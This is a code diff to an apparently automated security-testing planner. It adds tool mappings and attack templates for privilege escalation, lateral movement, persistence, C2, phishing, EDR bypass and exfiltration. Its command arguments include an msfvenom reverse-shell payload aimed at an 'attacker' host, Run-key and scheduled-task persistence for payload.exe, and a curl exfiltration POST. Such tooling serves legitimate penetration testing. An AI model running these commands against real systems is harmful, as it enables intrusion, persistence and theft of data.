@@ -48,6 +48,34 @@ TOOL_ALTERNATIVES: dict[str, list[str]] = {
     "aircrack-ng": ["hashcat", "john"],
     "sqlmap": ["jSQL", "sqlninja"],
     "ping": ["nmap", "fping", "hping3"],
+    "winpeas": ["seatbelt", "sharpup", "powerup"],
+    "linpeas": ["pspy", "linenum", "linux-exploit-suggester"],
+    "crackmapexec": ["netexec", "smbmap"],
+    "netexec": ["crackmapexec", "smbmap"],
+    "gophish": ["evilginx2", "modlishka"],
+    "evilginx2": ["gophish", "modlishka"],
+    "binwalk": ["firmwalker", "unblob"],
+    "mobsf": ["apktool", "jadx"],
+    "frida": ["objection"],
+    "objection": ["frida"],
+    "chisel": ["ligolo-ng", "socat"],
+    "ligolo-ng": ["chisel", "socat"],
+    "hashcat": ["john", "john-the-ripper"],
+    "john": ["hashcat"],
+    "volatility": ["volatility3"],
+    "volatility3": ["volatility"],
+    "steghide": ["stegcracker", "outguess"],
+    "stegcracker": ["steghide"],
+    "metasploit": ["msfconsole"],
+    "msfconsole": ["metasploit"],
+    "rubeus": ["impacket-GetUserSPNs"],
+    "mimikatz": ["pypykatz", "lsassy", "nanodump"],
+    "pypykatz": ["mimikatz"],
+    "certipy": ["certify"],
+    "certify": ["certipy"],
+    "bettercap": ["ettercap"],
+    "ettercap": ["bettercap"],
+    "wifite": ["hcxtools", "aircrack-ng"],
 }
 
 
@@ -565,6 +593,118 @@ _MULTI_WORD_CHECKS = [
     ("check cpu", "top", "Show CPU usage", "-bn1"),
     ("battery status", "acpi", "Show battery status", ""),
     ("battery level", "acpi", "Show battery level", ""),
+    # ── Windows Privilege Escalation ────────────────────────────────────────
+    ("windows privilege", "winpeas", "Windows privilege escalation enumeration", ""),
+    ("token impersonation", "incognito", "Token impersonation privilege escalation", ""),
+    ("juicy potato", "JuicyPotatoNG", "JuicyPotato privilege escalation", ""),
+    ("print spoofer", "PrintSpoofer", "PrintSpoofer privilege escalation", ""),
+    ("god potato", "GodPotato", "GodPotato privilege escalation", ""),
+    ("unquoted service", "winpeas", "Unquoted service path enumeration", ""),
+    ("seimpersonate", "winpeas", "SeImpersonatePrivilege check", ""),
+    # ── Linux Privilege Escalation ──────────────────────────────────────────
+    ("linux privilege", "linpeas", "Linux privilege escalation enumeration", ""),
+    ("suid binary", "find", "SUID binary search", "/ -perm -4000 -type f 2>/dev/null"),
+    ("sudo abuse", "sudo", "Sudo abuse privilege escalation", "-l"),
+    ("nfs root squash", "showmount", "NFS root squash exploitation", "-e"),
+    ("cron abuse", "crontab", "Cron job abuse", "-l"),
+    ("capabilities exploit", "getcap", "Linux capabilities exploitation", "-r / 2>/dev/null"),
+    # ── Lateral Movement ────────────────────────────────────────────────────
+    ("pass the hash", "crackmapexec", "Pass-the-Hash lateral movement", "smb"),
+    ("pass the ticket", "rubeus", "Pass-the-Ticket Kerberos attack", "ptt"),
+    ("over pass the hash", "rubeus", "Overpass-the-Hash attack", "asktgt"),
+    ("wmi exec", "wmiexec", "WMI remote execution", ""),
+    ("lateral movement", "crackmapexec", "Lateral movement enumeration", "smb"),
+    ("rdp lateral", "xfreerdp", "RDP lateral movement", "/v:"),
+    ("port forward", "chisel", "Port forwarding via Chisel", "client"),
+    ("socks proxy", "chisel", "SOCKS5 proxy via Chisel", "client --socks5"),
+    # ── Persistence ─────────────────────────────────────────────────────────
+    ("scheduled task", "schtasks", "Windows scheduled task persistence", "/create"),
+    ("registry run", "reg", "Registry Run key persistence", "add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
+    ("web shell", "weevely", "Web shell deployment", ""),
+    ("cron persistence", "crontab", "Cron-based persistence", "-e"),
+    ("startup persistence", "autoruns", "Startup persistence enumeration", ""),
+    # ── Defense Evasion ─────────────────────────────────────────────────────
+    ("amsi bypass", "amsi-bypass", "AMSI bypass", ""),
+    ("etw bypass", "etw-bypass", "ETW patching bypass", ""),
+    ("av bypass", "veil", "Antivirus evasion bypass", ""),
+    ("edr bypass", "veil", "EDR evasion technique", ""),
+    ("uac bypass", "fodhelper", "UAC bypass technique", ""),
+    ("defense evasion", "veil", "Defense evasion via payload encoding", ""),
+    ("payload obfuscation", "veil", "Payload obfuscation", ""),
+    # ── Data Exfiltration ───────────────────────────────────────────────────
+    ("dns exfil", "iodine", "DNS-based data exfiltration", ""),
+    ("dns tunnel", "iodine", "DNS tunneling for exfiltration", ""),
+    ("icmp tunnel", "ptunnel-ng", "ICMP tunnel for data exfiltration", ""),
+    ("data exfil", "curl", "HTTP-based data exfiltration", ""),
+    ("covert channel", "iodine", "Covert channel exfiltration", ""),
+    # ── Social Engineering ──────────────────────────────────────────────────
+    ("phishing campaign", "gophish", "Phishing campaign setup", ""),
+    ("spear phishing", "gophish", "Spear phishing campaign", ""),
+    ("clone site", "set", "Website cloning for phishing", ""),
+    ("credential harvest", "evilginx2", "Credential harvesting reverse proxy", ""),
+    ("email spoofing", "swaks", "Email spoofing test", "--to target@example.com --from spoof@example.com"),
+    # ── IoT / Firmware ──────────────────────────────────────────────────────
+    ("firmware analysis", "binwalk", "Firmware analysis and extraction", "-e"),
+    ("firmware extract", "binwalk", "Firmware extraction", "-eM"),
+    ("iot device", "nmap", "IoT device discovery", "-sV --script banner"),
+    ("uart console", "minicom", "UART serial console access", ""),
+    ("jtag debug", "openocd", "JTAG debugging interface", ""),
+    ("flash dump", "flashrom", "Flash memory dump", ""),
+    # ── OT / ICS / SCADA ───────────────────────────────────────────────────
+    ("modbus scan", "mbtget", "Modbus device enumeration", ""),
+    ("ics recon", "plcscan", "ICS/SCADA device discovery", ""),
+    ("scada enum", "plcscan", "SCADA system enumeration", ""),
+    ("dnp3 scan", "nmap", "DNP3 protocol scan", "--script dnp3-info -p 20000"),
+    ("s7 scan", "nmap", "Siemens S7 PLC scan", "--script s7-info -p 102"),
+    ("plc discovery", "plcscan", "PLC device discovery", ""),
+    # ── Mobile Security ─────────────────────────────────────────────────────
+    ("android analysis", "mobsf", "Android application security analysis", ""),
+    ("apk analysis", "apktool", "APK decompilation and analysis", "d"),
+    ("ios analysis", "objection", "iOS application security analysis", "explore"),
+    ("ssl pinning bypass", "objection", "SSL certificate pinning bypass", "ios sslpinning disable"),
+    ("root detection bypass", "objection", "Root detection bypass", "android root disable"),
+    ("frida hook", "frida", "Frida dynamic instrumentation hook", ""),
+    ("runtime analysis", "frida", "Mobile app runtime analysis", ""),
+    # ── Cloud Attack ────────────────────────────────────────────────────────
+    ("azure ad enum", "aadinternals", "Azure AD enumeration", ""),
+    ("azure enum", "roadtools", "Azure environment enumeration", ""),
+    ("gcp enum", "gcloud", "GCP environment enumeration", "projects list"),
+    ("cloud metadata", "curl", "Cloud metadata service enumeration", "-s http://169.254.169.254/latest/meta-data/"),
+    ("imds enum", "curl", "Instance Metadata Service enumeration", "-s http://169.254.169.254/latest/meta-data/"),
+    ("iam enum", "gcloud", "IAM permissions enumeration", "projects get-iam-policy"),
+    # ── Kubernetes / Container ──────────────────────────────────────────────
+    ("kubernetes attack", "kubectl", "Kubernetes attack surface enumeration", "auth can-i --list"),
+    ("k8s attack", "kubectl", "Kubernetes attack enumeration", "auth can-i --list"),
+    ("container escape", "cdk", "Container escape exploitation", "auto-escape"),
+    ("etcd access", "etcdctl", "Etcd datastore access", "get / --prefix"),
+    ("rbac audit", "kubectl", "Kubernetes RBAC audit", "auth can-i --list --as system:serviceaccount"),
+    # ── Cryptography / Hash ─────────────────────────────────────────────────
+    ("hash identify", "hashid", "Hash type identification", ""),
+    ("hash crack", "hashcat", "Password hash cracking", "-a 0"),
+    ("rainbow table", "hashcat", "Rainbow table attack", "-a 0 -O"),
+    ("padding oracle", "padbuster", "Padding oracle attack", ""),
+    # ── CTF ─────────────────────────────────────────────────────────────────
+    ("ctf forensics", "foremost", "CTF forensics file carving", ""),
+    ("ctf stego", "steghide", "CTF steganography extraction", "extract -sf"),
+    ("ctf crypto", "rsactftool", "CTF cryptography tool", ""),
+    ("ctf pwn", "pwndbg", "CTF binary exploitation", ""),
+    ("buffer overflow", "pwndbg", "Buffer overflow exploitation", ""),
+    ("rop chain", "ROPgadget", "ROP chain construction", "--binary"),
+    ("heap exploit", "pwndbg", "Heap exploitation", ""),
+    ("format string", "pwndbg", "Format string vulnerability exploitation", ""),
+    # ── Purple Team / Threat Hunting ────────────────────────────────────────
+    ("atomic red team", "invoke-atomicredteam", "Atomic Red Team attack simulation", ""),
+    ("attack simulation", "caldera", "MITRE ATT&CK attack simulation", ""),
+    ("threat hunt", "osquery", "Threat hunting via endpoint query", ""),
+    ("sigma hunt", "sigmac", "Sigma rule threat hunting", ""),
+    ("yara hunt", "yara", "YARA rule threat hunting", ""),
+    # ── Bug Bounty ───────────────────────────────────────────────────────────
+    ("bug bounty", "nuclei", "Bug bounty vulnerability scan", "-severity medium,high,critical"),
+    ("responsible disclosure", "nuclei", "Responsible disclosure vulnerability scan", ""),
+    # ── Supply Chain ─────────────────────────────────────────────────────────
+    ("supply chain", "pip-audit", "Supply chain vulnerability audit", ""),
+    ("dependency confusion", "confused", "Dependency confusion attack check", ""),
+    ("typosquatting", "pip-audit", "Typosquatting package check", ""),
 ]
 
 
@@ -604,6 +744,31 @@ class RegistryPlanner:
             "cloud_audit_aws",
             "malware_analysis",
             "reverse_engineering",
+            "windows_privesc",
+            "linux_privesc_full",
+            "lateral_movement",
+            "persistence",
+            "c2_setup",
+            "phishing_campaign",
+            "iot_firmware",
+            "ics_recon",
+            "mobile_android",
+            "mobile_ios",
+            "cloud_azure",
+            "cloud_gcp",
+            "k8s_attack",
+            "crypto_attack",
+            "ctf_forensics",
+            "ctf_pwn",
+            "ctf_crypto",
+            "threat_hunting",
+            "incident_response_full",
+            "purple_team",
+            "edr_bypass",
+            "data_exfiltration",
+            "social_engineering",
+            "bug_bounty_web",
+            "supply_chain",
         }
         self._cron_path = "/etc/crontab" if os.name != "nt" else "C:\\Windows\\System32\\Tasks"
         self._templates: dict[str, list[dict[str, Any]]] = self._build_templates()
@@ -1170,6 +1335,651 @@ class RegistryPlanner:
                     "description": "Android APK decompilation and analysis",
                     "tool": "apktool",
                     "args": {},
+                },
+            ],
+            "windows_privesc": [
+                {
+                    "description": "Automated Windows privilege escalation enumeration",
+                    "tool": "winpeas",
+                    "args": {"flags": "quiet"},
+                },
+                {
+                    "description": "Windows privilege escalation checks via PowerShell",
+                    "tool": "powerup",
+                    "args": {"flags": "Invoke-AllChecks"},
+                },
+                {
+                    "description": "Windows post-exploitation recon with Seatbelt",
+                    "tool": "seatbelt",
+                    "args": {"flags": "-group=all"},
+                },
+                {
+                    "description": "Token and delegation privilege enumeration",
+                    "tool": "incognito",
+                    "args": {"flags": "list_tokens -u"},
+                },
+            ],
+            "linux_privesc_full": [
+                {
+                    "description": "Automated Linux privilege escalation enumeration",
+                    "tool": "linpeas",
+                    "args": {},
+                },
+                {
+                    "description": "SUID and SGID binary discovery",
+                    "tool": "find",
+                    "args": {"flags": "/ -perm -4000 -type f 2>/dev/null"},
+                },
+                {
+                    "description": "Linux capabilities enumeration",
+                    "tool": "getcap",
+                    "args": {"flags": "-r / 2>/dev/null"},
+                },
+                {
+                    "description": "Sudo permissions enumeration",
+                    "tool": "sudo",
+                    "args": {"flags": "-l"},
+                },
+                {
+                    "description": "Cron job and scheduled task inspection",
+                    "tool": "crontab",
+                    "args": {"flags": "-l"},
+                },
+                {
+                    "description": "NFS share export enumeration for root squash",
+                    "tool": "showmount",
+                    "args": {"flags": "-e"},
+                },
+                {
+                    "description": "Process monitoring for credential leakage",
+                    "tool": "pspy",
+                    "args": {},
+                },
+            ],
+            "lateral_movement": [
+                {
+                    "description": "SMB host reachability and authentication check",
+                    "tool": "crackmapexec",
+                    "args": {"flags": "smb"},
+                },
+                {
+                    "description": "WMI remote command execution",
+                    "tool": "wmiexec",
+                    "args": {"flags": "-nopass"},
+                },
+                {
+                    "description": "SMB relay and remote execution",
+                    "tool": "smbexec",
+                    "args": {},
+                },
+                {
+                    "description": "SOCKS5 proxy tunnel for pivoting",
+                    "tool": "chisel",
+                    "args": {"flags": "client --socks5"},
+                },
+                {
+                    "description": "RDP lateral movement",
+                    "tool": "xfreerdp",
+                    "args": {"flags": "/v:{target} /dynamic-resolution"},
+                },
+            ],
+            "persistence": [
+                {
+                    "description": "Windows scheduled task persistence",
+                    "tool": "schtasks",
+                    "args": {"flags": "/create /sc onlogon /tn Updater /tr payload.exe"},
+                },
+                {
+                    "description": "Registry Run key persistence",
+                    "tool": "reg",
+                    "args": {"flags": "add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d payload.exe"},
+                },
+                {
+                    "description": "Linux cron-based persistence",
+                    "tool": "crontab",
+                    "args": {"flags": "-e"},
+                },
+                {
+                    "description": "Autoruns enumeration for persistence locations",
+                    "tool": "autoruns",
+                    "args": {},
+                },
+            ],
+            "c2_setup": [
+                {
+                    "description": "Generate reverse shell payload with msfvenom",
+                    "tool": "msfvenom",
+                    "args": {"flags": "-p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe"},
+                },
+                {
+                    "description": "Start Metasploit multi-handler listener",
+                    "tool": "msfconsole",
+                    "args": {"flags": "-q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'"},
+                },
+                {
+                    "description": "C2 infrastructure port check",
+                    "tool": "nmap",
+                    "args": {"flags": "-sT -p 4444,8080,8443,443,80"},
+                },
+            ],
+            "phishing_campaign": [
+                {
+                    "description": "Set up GoPhish phishing campaign server",
+                    "tool": "gophish",
+                    "args": {},
+                },
+                {
+                    "description": "Clone target website for phishing",
+                    "tool": "set",
+                    "args": {"flags": "2 3"},
+                },
+                {
+                    "description": "Harvest target email addresses",
+                    "tool": "theHarvester",
+                    "args": {"flags": "-d {target} -b all"},
+                },
+                {
+                    "description": "Test email spoofing deliverability",
+                    "tool": "swaks",
+                    "args": {"flags": "--to target@{target} --from spoof@{target}"},
+                },
+                {
+                    "description": "SPF/DMARC/DKIM email security posture check",
+                    "tool": "dig",
+                    "args": {"flags": "TXT {target}"},
+                },
+            ],
+            "iot_firmware": [
+                {
+                    "description": "Firmware analysis and file system extraction",
+                    "tool": "binwalk",
+                    "args": {"flags": "-eM"},
+                },
+                {
+                    "description": "Extract printable strings from firmware",
+                    "tool": "strings",
+                    "args": {},
+                },
+                {
+                    "description": "Binary hardening and security feature check",
+                    "tool": "checksec",
+                    "args": {"flags": "--file"},
+                },
+                {
+                    "description": "Metadata and EXIF data extraction",
+                    "tool": "exiftool",
+                    "args": {},
+                },
+                {
+                    "description": "YARA malware pattern scan on firmware",
+                    "tool": "yara",
+                    "args": {},
+                },
+            ],
+            "ics_recon": [
+                {
+                    "description": "ICS/SCADA device discovery via Nmap ICS scripts",
+                    "tool": "nmap",
+                    "args": {"flags": "--script modbus-discover,dnp3-info,s7-info -p 102,502,20000"},
+                },
+                {
+                    "description": "Modbus device enumeration",
+                    "tool": "mbtget",
+                    "args": {},
+                },
+                {
+                    "description": "PLC device discovery and enumeration",
+                    "tool": "plcscan",
+                    "args": {},
+                },
+                {
+                    "description": "Shodan search for ICS/SCADA exposed devices",
+                    "tool": "shodan",
+                    "args": {"flags": "search port:502 modbus"},
+                },
+            ],
+            "mobile_android": [
+                {
+                    "description": "Pull APK from Android device via ADB",
+                    "tool": "adb",
+                    "args": {"flags": "shell pm list packages -3"},
+                },
+                {
+                    "description": "Decompile APK for static analysis",
+                    "tool": "apktool",
+                    "args": {"flags": "d"},
+                },
+                {
+                    "description": "Scan APK for secrets and hardcoded credentials",
+                    "tool": "apkleaks",
+                    "args": {},
+                },
+                {
+                    "description": "Dynamic analysis and hooking with Frida",
+                    "tool": "frida",
+                    "args": {"flags": "-U -f com.target.app --no-pause"},
+                },
+                {
+                    "description": "Runtime mobile security testing with Objection",
+                    "tool": "objection",
+                    "args": {"flags": "explore"},
+                },
+            ],
+            "mobile_ios": [
+                {
+                    "description": "Attach to iOS process with Frida",
+                    "tool": "frida",
+                    "args": {"flags": "-U TargetApp"},
+                },
+                {
+                    "description": "iOS runtime analysis with Objection",
+                    "tool": "objection",
+                    "args": {"flags": "explore"},
+                },
+                {
+                    "description": "Disable SSL certificate pinning",
+                    "tool": "objection",
+                    "args": {"flags": "ios sslpinning disable"},
+                },
+                {
+                    "description": "Dump iOS keychain data",
+                    "tool": "objection",
+                    "args": {"flags": "ios keychain dump"},
+                },
+            ],
+            "cloud_azure": [
+                {
+                    "description": "Azure AD tenant and user enumeration",
+                    "tool": "aadinternals",
+                    "args": {"flags": "Invoke-AADIntReconAsOutsider"},
+                },
+                {
+                    "description": "Azure environment enumeration via ROADtools",
+                    "tool": "roadtools",
+                    "args": {"flags": "auth"},
+                },
+                {
+                    "description": "PowerZure Azure privilege assessment",
+                    "tool": "powerzure",
+                    "args": {"flags": "Show-AzureRunAsConnection"},
+                },
+                {
+                    "description": "Azure BloodHound data collection",
+                    "tool": "azurehound",
+                    "args": {"flags": "list"},
+                },
+                {
+                    "description": "Microsoft 365 user and service enumeration",
+                    "tool": "aadinternals",
+                    "args": {"flags": "Invoke-AADIntUserEnumerationAsGuest"},
+                },
+            ],
+            "cloud_gcp": [
+                {
+                    "description": "GCP project and resource enumeration",
+                    "tool": "gcloud",
+                    "args": {"flags": "projects list"},
+                },
+                {
+                    "description": "GCP IAM policy enumeration",
+                    "tool": "gcloud",
+                    "args": {"flags": "projects get-iam-policy {target}"},
+                },
+                {
+                    "description": "GCP metadata service enumeration",
+                    "tool": "curl",
+                    "args": {"flags": "-s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/"},
+                },
+                {
+                    "description": "Multi-cloud GCP security audit",
+                    "tool": "scoutsuite",
+                    "args": {"flags": "gcp"},
+                },
+            ],
+            "k8s_attack": [
+                {
+                    "description": "Kubernetes RBAC permissions enumeration",
+                    "tool": "kubectl",
+                    "args": {"flags": "auth can-i --list"},
+                },
+                {
+                    "description": "Kubernetes security benchmark audit",
+                    "tool": "kube-bench",
+                    "args": {},
+                },
+                {
+                    "description": "Kubernetes cluster attack surface mapping",
+                    "tool": "kube-hunter",
+                    "args": {"flags": "--remote"},
+                },
+                {
+                    "description": "Container escape exploitation",
+                    "tool": "cdk",
+                    "args": {"flags": "auto-escape"},
+                },
+                {
+                    "description": "Etcd datastore access attempt",
+                    "tool": "etcdctl",
+                    "args": {"flags": "get / --prefix"},
+                },
+                {
+                    "description": "Kubernetes workload and secret enumeration",
+                    "tool": "kubectl",
+                    "args": {"flags": "get secrets --all-namespaces"},
+                },
+            ],
+            "crypto_attack": [
+                {
+                    "description": "Hash type identification",
+                    "tool": "hashid",
+                    "args": {},
+                },
+                {
+                    "description": "Dictionary-based hash cracking",
+                    "tool": "hashcat",
+                    "args": {"flags": "-a 0"},
+                },
+                {
+                    "description": "Rule-based hash cracking",
+                    "tool": "hashcat",
+                    "args": {"flags": "-a 0 -r rules/best64.rule"},
+                },
+                {
+                    "description": "Alternative hash cracker (John the Ripper)",
+                    "tool": "john",
+                    "args": {"flags": "--wordlist=/usr/share/wordlists/rockyou.txt"},
+                },
+            ],
+            "ctf_forensics": [
+                {
+                    "description": "File type identification",
+                    "tool": "file",
+                    "args": {},
+                },
+                {
+                    "description": "Extract printable strings from binary",
+                    "tool": "strings",
+                    "args": {"flags": "-n 6"},
+                },
+                {
+                    "description": "Firmware/binary analysis and extraction",
+                    "tool": "binwalk",
+                    "args": {"flags": "-e"},
+                },
+                {
+                    "description": "Metadata extraction from files",
+                    "tool": "exiftool",
+                    "args": {},
+                },
+                {
+                    "description": "Steganography extraction",
+                    "tool": "steghide",
+                    "args": {"flags": "extract -sf"},
+                },
+                {
+                    "description": "File carving for deleted/hidden files",
+                    "tool": "foremost",
+                    "args": {},
+                },
+            ],
+            "ctf_pwn": [
+                {
+                    "description": "Binary security feature check (NX, PIE, RELRO, canary)",
+                    "tool": "checksec",
+                    "args": {"flags": "--file"},
+                },
+                {
+                    "description": "ROP gadget discovery",
+                    "tool": "ROPgadget",
+                    "args": {"flags": "--binary"},
+                },
+                {
+                    "description": "GDB with pwndbg/peda for debugging",
+                    "tool": "pwndbg",
+                    "args": {},
+                },
+                {
+                    "description": "Extract printable strings for analysis",
+                    "tool": "strings",
+                    "args": {},
+                },
+            ],
+            "ctf_crypto": [
+                {
+                    "description": "RSA CTF attack toolkit",
+                    "tool": "rsactftool",
+                    "args": {},
+                },
+                {
+                    "description": "Hash type identification",
+                    "tool": "hashid",
+                    "args": {},
+                },
+                {
+                    "description": "Hash cracking for CTF challenges",
+                    "tool": "hashcat",
+                    "args": {"flags": "-a 0"},
+                },
+                {
+                    "description": "OpenSSL cryptographic operations",
+                    "tool": "openssl",
+                    "args": {},
+                },
+            ],
+            "threat_hunting": [
+                {
+                    "description": "Endpoint threat hunting via SQL-like queries",
+                    "tool": "osquery",
+                    "args": {},
+                },
+                {
+                    "description": "YARA rule-based malware hunting",
+                    "tool": "yara",
+                    "args": {},
+                },
+                {
+                    "description": "Sigma rule-based log threat hunting",
+                    "tool": "sigmac",
+                    "args": {"flags": "--target splunk"},
+                },
+                {
+                    "description": "Windows event log hunting for suspicious activity",
+                    "tool": "wevtutil",
+                    "args": {"flags": "qe Security"},
+                },
+                {
+                    "description": "Linux log hunting for IOCs",
+                    "tool": "journalctl",
+                    "args": {"flags": "--since '24 hours ago'"},
+                },
+            ],
+            "incident_response_full": [
+                {
+                    "description": "Live process and network state collection",
+                    "tool": "ps",
+                    "args": {"flags": "aux"},
+                },
+                {
+                    "description": "Active network connections snapshot",
+                    "tool": "netstat",
+                    "args": {"flags": "-ano"},
+                },
+                {
+                    "description": "Memory dump for forensic analysis",
+                    "tool": "volatility",
+                    "args": {"flags": "-f"},
+                },
+                {
+                    "description": "Disk image creation for forensic preservation",
+                    "tool": "dd",
+                    "args": {"flags": "if=/dev/sda of=disk.img bs=4M status=progress"},
+                },
+                {
+                    "description": "File system timeline generation",
+                    "tool": "sleuthkit",
+                    "args": {"flags": "fls -r"},
+                },
+                {
+                    "description": "YARA scan against running processes and files",
+                    "tool": "yara",
+                    "args": {},
+                },
+                {
+                    "description": "Windows event log collection",
+                    "tool": "wevtutil",
+                    "args": {"flags": "epl Security security.evtx"},
+                },
+            ],
+            "purple_team": [
+                {
+                    "description": "Atomic Red Team attack simulation",
+                    "tool": "invoke-atomicredteam",
+                    "args": {"flags": "Invoke-AtomicTest"},
+                },
+                {
+                    "description": "MITRE ATT&CK adversary emulation with Caldera",
+                    "tool": "caldera",
+                    "args": {},
+                },
+                {
+                    "description": "Detection validation against SIEM rules",
+                    "tool": "sigmac",
+                    "args": {"flags": "--target splunk"},
+                },
+                {
+                    "description": "Endpoint detection effectiveness check",
+                    "tool": "osquery",
+                    "args": {},
+                },
+            ],
+            "edr_bypass": [
+                {
+                    "description": "AMSI bypass implementation",
+                    "tool": "amsi-bypass",
+                    "args": {},
+                },
+                {
+                    "description": "Payload generation with AV evasion",
+                    "tool": "veil",
+                    "args": {},
+                },
+                {
+                    "description": "Shellcode obfuscation and encoding",
+                    "tool": "donut",
+                    "args": {},
+                },
+                {
+                    "description": "LOLBAS technique discovery",
+                    "tool": "curl",
+                    "args": {"flags": "-s https://lolbas-project.github.io/api/lolbas.json"},
+                },
+            ],
+            "data_exfiltration": [
+                {
+                    "description": "DNS-based data exfiltration tunnel",
+                    "tool": "iodine",
+                    "args": {},
+                },
+                {
+                    "description": "ICMP-based data exfiltration tunnel",
+                    "tool": "ptunnel-ng",
+                    "args": {},
+                },
+                {
+                    "description": "HTTP-based covert data exfiltration",
+                    "tool": "curl",
+                    "args": {"flags": "-s -X POST -d @data.txt"},
+                },
+                {
+                    "description": "Data compression before exfiltration",
+                    "tool": "tar",
+                    "args": {"flags": "-czf data.tar.gz"},
+                },
+            ],
+            "social_engineering": [
+                {
+                    "description": "Phishing campaign management with GoPhish",
+                    "tool": "gophish",
+                    "args": {},
+                },
+                {
+                    "description": "Reverse proxy credential harvesting",
+                    "tool": "evilginx2",
+                    "args": {},
+                },
+                {
+                    "description": "Email harvesting for phishing targets",
+                    "tool": "theHarvester",
+                    "args": {"flags": "-d {target} -b all"},
+                },
+                {
+                    "description": "OSINT target profiling for pretexting",
+                    "tool": "sherlock",
+                    "args": {},
+                },
+            ],
+            "bug_bounty_web": [
+                {
+                    "description": "Passive subdomain enumeration",
+                    "tool": "subfinder",
+                    "args": {},
+                },
+                {
+                    "description": "HTTP endpoint probing and technology detection",
+                    "tool": "httpx",
+                    "args": {"flags": "-status-code -title -tech-detect"},
+                },
+                {
+                    "description": "Parameter discovery from historical URLs",
+                    "tool": "gau",
+                    "args": {},
+                },
+                {
+                    "description": "HTTP parameter discovery",
+                    "tool": "arjun",
+                    "args": {},
+                },
+                {
+                    "description": "Template-based vulnerability scanning",
+                    "tool": "nuclei",
+                    "args": {"severity": "medium,high,critical"},
+                },
+                {
+                    "description": "XSS vulnerability scanning",
+                    "tool": "dalfox",
+                    "args": {},
+                },
+                {
+                    "description": "SQL injection scanning",
+                    "tool": "sqlmap",
+                    "args": {"flags": "--batch --random-agent"},
+                },
+            ],
+            "supply_chain": [
+                {
+                    "description": "Python package dependency vulnerability audit",
+                    "tool": "pip-audit",
+                    "args": {},
+                },
+                {
+                    "description": "Dependency confusion attack surface check",
+                    "tool": "confused",
+                    "args": {},
+                },
+                {
+                    "description": "Software composition analysis with Grype",
+                    "tool": "grype",
+                    "args": {},
+                },
+                {
+                    "description": "SBOM generation for dependency tracking",
+                    "tool": "syft",
+                    "args": {},
+                },
+                {
+                    "description": "Git secrets and credential leak scan",
+                    "tool": "gitleaks",
+                    "args": {"flags": "detect"},
                 },
             ],
         }
